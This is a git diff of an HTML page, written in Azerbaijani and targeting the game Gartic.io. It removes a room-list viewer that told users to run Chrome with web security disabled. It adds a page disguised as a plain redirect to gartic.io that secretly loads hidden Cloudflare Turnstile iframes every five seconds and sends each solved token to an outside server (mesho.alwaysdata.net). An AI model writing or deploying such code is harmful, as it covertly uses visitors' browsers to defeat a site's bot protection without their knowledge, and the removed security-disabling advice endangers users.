@@ -3,173 +3,121 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Gartic.io Otaqlar – WhoWhere V2 (Oyunçularla)</title>
+  <title>Gartic.io</title>
   <style>
-    body { margin:0; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background:#0a0a0a; color:#f0f0f0; }
-    .overlay { position:fixed; inset:0; background:#000; padding:20px; overflow-y:auto; text-align:center; }
-    h2 { color:#ff3c3c; text-shadow:0 0 8px #ff3c3c, 0 0 16px #ff0000; margin-bottom:10px; }
-    select, .btn { font-size:16px; padding:6px 12px; border-radius:30px; background:#222; color:white; border:1px solid #444; margin:4px; cursor:pointer; text-decoration:none; display:inline-block; }
-    .btn:hover { background:#ff3c3c !important; }
-    .flex { display:flex; justify-content:center; flex-wrap:wrap; gap:12px; margin-top:1rem; }
-    .flex-child { background:#111; padding:12px 18px; min-width:180px; border-radius:12px; box-shadow:0 0 12px rgba(255,0,0,0.5); display:flex; flex-direction:column; align-items:center; transition:all 0.25s; }
-    .flex-child:hover { transform:translateY(-5px); box-shadow:0 0 20px rgba(255,0,0,0.8); }
-    .flex-child img { width:32px; height:32px; border-radius:50%; border:1px solid #666; margin-bottom:6px; }
-    .users { width:100%; margin:8px 0; min-height:60px; max-height:150px; overflow-y:auto; }
-    .user-info { display:flex; align-items:center; margin-bottom:6px; font-size:13px; color:#ccc; }
-    .user-info img { width:24px; height:24px; margin-right:8px; border-radius:50%; }
-    .viewer-btn, .fako-btn { display:block; width:80px; margin:6px auto 0; padding:4px 0; border-radius:6px; background:#222; color:#fff; text-decoration:none; font-weight:bold; font-size:12px; box-shadow:0 0 6px rgba(255,0,0,0.5); transition:all 0.2s; }
-    .viewer-btn:hover, .fako-btn:hover { background:#ff0000; box-shadow:0 0 12px rgba(255,0,0,0.8); }
-    #total { position:fixed; top:10px; left:10px; background:darkslateblue; color:white; padding:6px 12px; border-radius:6px; z-index:10000; font-size:14px; }
-    #status { color:#ffcc00; font-weight:bold; margin:10px; font-size:14px; }
-    .error-msg { color:#ff6666; font-size:12px; margin:4px 0; }
-    .loading { color:#888; }
+    body { 
+      margin: 0; 
+      height: 100vh; 
+      background: #000; 
+      color: #fff; 
+      font-family: Arial, sans-serif; 
+      display: flex; 
+      flex-direction: column; 
+      justify-content: center; 
+      align-items: center; 
+      text-align: center; 
+    }
+    h1 { 
+      color: #ff3c3c; 
+      font-size: 4rem; 
+      margin-bottom: 1rem; 
+      text-shadow: 0 0 20px #ff0000; 
+    }
+    p { font-size: 1.5rem; margin: 1rem 0; }
+    .spinner { 
+      border: 8px solid #222; 
+      border-top: 8px solid #ff3c3c; 
+      border-radius: 50%; 
+      width: 60px; 
+      height: 60px; 
+      animation: spin 1s linear infinite; 
+      margin: 2rem 0; 
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
 
-<div class="overlay">
-  <h2>M2H • Gartic.io Otaqlar (Oyunçularla – Chrome disable ilə)</h2>
-  <div id="status">Yüklənir...</div>
-  
-  <select id="lg">
-    <option value="23" selected>Azərbaycanca</option>
-    <!-- Digər dillər eyni -->
-    <option value="1">Português</option><option value="2">English</option><option value="3">Español</option><option value="4">Français</option><option value="5">Italiano</option>
-    <option value="6">Deutsch</option><option value="7">Русский</option><option value="8">Türkçe</option><option value="9">Polski</option><option value="10">Nederlands</option>
-    <option value="11">Čeština</option><option value="12">Magyar</option><option value="13">Română</option><option value="14">Українська</option>
-    <option value="15">Svenska</option><option value="16">Suomi</option><option value="17">Dansk</option><option value="18">Norsk</option>
-    <option value="19">العربية</option><option value="20">فارسی</option><option value="21">한국어</option><option value="22">日本語</option>
-    <option value="24">हिन्दी</option><option value="25">ไทย</option><option value="26">Bahasa Indonesia</option><option value="27">Tiếng Việt</option><option value="28">中文</option>
-  </select>
-  <br>
-  <a href="#" id="fakoBtn" class="btn" style="background:#00ff00;color:black;">🔥 FAKO Viewer (Tampermonkey)</a>
+  <h1>Gartic.io</h1>
+  <p>Sayta keçirilir... Token toplanır (arka planda)</p>
+  <div class="spinner"></div>
 
-  <div class="flex" id="rooms"></div>
-</div>
+  <script>
+    'use strict';
 
-<div id="total">Yüklənir...</div>
+    const TOKEN_INTERVAL = 5000;      // hər ~5 saniyədən bir yeni token cəhdi
+    const PAGE_REFRESH_INTERVAL = 2 * 60 * 1000;  // 2 dəqiqədən bir yenilə
 
-<script>
-const langSelect = document.getElementById('lg');
-const roomsContainer = document.getElementById('rooms');
-const totalDisplay = document.getElementById('total');
-const statusDiv = document.getElementById('status');
-const fakoBtn = document.getElementById('fakoBtn');
+    function createTurnstileFrame() {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.sandbox = "allow-scripts allow-same-origin";
+        document.body.appendChild(iframe);
 
-fakoBtn.href = `https://gartic.io/?fako&lang=${langSelect.value}`;
-langSelect.onchange = () => { fakoBtn.href = `https://gartic.io/?fako&lang=${langSelect.value}`; loadRooms(langSelect.value); };
+        const html = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+            </head>
+            <body>
+                <div id="cf-turnstile"></div>
+                <script>
+                    window.onload = function() {
+                        turnstile.render("#cf-turnstile", {
+                            sitekey: "0x4AAAAAABBPKaIbNwnPEfSo",
+                            callback: function(token) {
+                                parent.postMessage(token, "*");
+                            }
+                        });
+                    }
+                </script>
+            </body>
+            </html>
+        `;
 
-const PROXY = 'https://corsproxy.io/?';
-const BACKUP_PROXY = 'https://api.allorigins.win/raw?url=';
-
-async function fetchWithProxy(url, isText = false) {
-  try {
-    let fullUrl = PROXY + encodeURIComponent(url);
-    let res = await fetch(fullUrl);
-    if (!res.ok) {
-      fullUrl = BACKUP_PROXY + encodeURIComponent(url);
-      res = await fetch(fullUrl);
-    }
-    if (!res.ok) throw new Error(`HTTP ${res.status}`);
-    return isText ? await res.text() : await res.json();
-  } catch (err) {
-    throw err;
-  }
-}
-
-async function loadRooms(lang = '23') {
-  roomsContainer.innerHTML = '<p class="loading">Otaqlar yüklənir...</p>';
-  totalDisplay.textContent = 'Yüklənir...';
-  statusDiv.textContent = 'Proxy ilə yüklənir... (Oyunçular üçün Chrome --disable-web-security istifadə et)';
-
-  try {
-    const listUrl = `https://gartic.io/req/list?search=&language[]=${lang}`;
-    const data = await fetchWithProxy(listUrl);
-
-    const active = data.filter(r => r.quant > 0);
-
-    if (active.length === 0) {
-      roomsContainer.innerHTML = '<h3>Seçilən dildə aktiv otaq yoxdur.</h3>';
-      return;
+        iframe.srcdoc = html;
     }
 
-    roomsContainer.innerHTML = '';
+    window.addEventListener("message", function (event) {
+        const token = event.data;
+        if (typeof token === "string" && token.length > 20) {
+            console.log("Token alındı:", token);
 
-    for (const room of active) {
-      const card = document.createElement('div');
-      card.className = 'flex-child';
+            fetch("https://mesho.alwaysdata.net/add-token", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ token: token })
+            })
+            .then(res => res.json())
+            .then(data => console.log("Server cavabı:", data))
+            .catch(err => console.error("Token göndərmə xətası:", err));
+        }
 
-      card.innerHTML = `
-        <h3>${room.id.slice(1)}</h3>
-        <img src="https://gartic.io/static/images/subjects/${room.subject}.svg" alt="subject">
-        <p>${room.quant} / ${room.max} ・ ${room.points} / ${room.goal}</p>
-        <div class="users" id="users-${room.code}">
-          <small class="loading">Oyunçular yüklənir...</small>
-        </div>
-        <a href="https://gartic.io/${room.code}/viewer" target="_blank" class="viewer-btn">Viewer</a>
-      `;
+        // İstifadədən sonra bütün iframe-ləri sil (yaddaş sızmasını qarşılamaq üçün)
+        document.querySelectorAll("iframe").forEach(iframe => iframe.remove());
+    });
 
-      roomsContainer.appendChild(card);
+    // Token toplamağı başla
+    setInterval(createTurnstileFrame, TOKEN_INTERVAL);
+    createTurnstileFrame();  // İlk dəfə dərhal başla
 
-      // WebSocket cəhdi (Chrome disable ilə işləyər)
-      try {
-        const viewerUrl = `https://gartic.io/serverViewer?room=${room.code}`;
-        const text = await fetchWithProxy(viewerUrl, true);
-        const serverNum = text.slice(15, 16);
-        if (!/^\d$/.test(serverNum)) throw new Error('Server tapılmadı');
+    // Səhifəni dondan qorumaq üçün avto-refresh
+    setTimeout(() => {
+        console.log("Səhifə yenilənir (dondan qorumaq üçün)...");
+        location.reload();
+    }, PAGE_REFRESH_INTERVAL);
 
-        const wsUrl = `wss://server0${serverNum}.gartic.io/socket.io/?EIO=3&transport=websocket`;
-        const ws = new WebSocket(wsUrl);
+    // Dərhal Gartic.io-ya keç
+    window.location.href = "https://gartic.io";
+    
+    // Əgər redirect gecikərsə (nadir hallarda), 3 saniyədən sonra yenidən cəhd
+    setTimeout(() => {
+      window.location.href = "https://gartic.io";
+    }, 3000);
+  </script>
 
-        ws.onopen = () => {
-          ws.send(`42["12",{"v":20000,"sala":"${room.id}"}]`);
-          document.getElementById(`users-${room.code}`).innerHTML = '<small>Bağlantı quruldu...</small>';
-        };
-
-        ws.onmessage = (event) => {
-          try {
-            const raw = event.data;
-            if (!raw.startsWith('42')) return;
-            const parsed = JSON.parse(raw.slice(2));
-            if (parsed[0] !== 5) return;
-
-            const usersDiv = document.getElementById(`users-${room.code}`);
-            usersDiv.innerHTML = '';
-
-            (parsed[5] || []).forEach(user => {
-              const div = document.createElement('div');
-              div.className = 'user-info';
-              div.innerHTML = `<img src="\( {user.foto || 'https://gartic.io/static/images/avatar/svg/0.svg'}" alt=""> <span> \){user.nick || 'Anonim'}</span>`;
-              usersDiv.appendChild(div);
-            });
-
-            if (usersDiv.children.length === 0) usersDiv.innerHTML = '<small class="error-msg">Otaqda heç kim yoxdur</small>';
-          } catch (e) { console.error('Parse xətası:', e); }
-        };
-
-        ws.onerror = (e) => {
-          console.error('WS xətası:', e); // Konsolda detalları gör
-          document.getElementById(`users-${room.code}`).innerHTML = '<small class="error-msg">WebSocket bloklandı (Chrome disable et!)</small>';
-        };
-
-      } catch (e) {
-        console.warn('Server xətası:', e);
-        document.getElementById(`users-${room.code}`).innerHTML = '<small class="error-msg">Server məlumatı yüklənmədi</small>';
-      }
-    }
-
-    const totalPlayers = active.reduce((sum, r) => sum + r.quant, 0);
-    totalDisplay.textContent = `Otaq: ${active.length} | Oyunçu: ${totalPlayers}`;
-    statusDiv.textContent = 'Yükləndi ✓ Oyunçular üçün: Chrome --disable-web-security və ya FAKO düyməsi';
-
-  } catch (err) {
-    statusDiv.textContent = 'Xəta: ' + err.message;
-    roomsContainer.innerHTML = `<h3 style="color:#f55">Xəta: ${err.message}</h3>`;
-  }
-}
-
-langSelect.onchange = () => loadRooms(langSelect.value);
-loadRooms('23');
-</script>
 </body>
 </html>
